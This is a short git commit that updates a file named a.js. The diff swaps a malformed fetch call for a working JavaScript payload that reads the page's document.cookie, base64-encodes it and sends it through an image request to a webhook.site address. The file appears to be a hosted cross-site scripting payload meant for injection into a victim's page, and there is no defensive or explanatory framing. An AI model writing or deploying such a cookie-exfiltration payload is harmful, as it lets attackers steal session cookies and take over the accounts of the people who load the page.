9782ab906471b5ca4a0215a7cd57a66990a7c14a
Men0s1 <163465991+Men0s1@users.noreply.github.com>
2024-12-31 13:13:48 +0300

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/e4c520ca-ee1b-4868-b372-1b4320c512ef?c'=+document.cookie)
+x = new Image(); x.src = 'https://webhook.site/e4c520ca-ee1b-4868-b372-1b4320c512ef?data='+btoa(document.cookie);
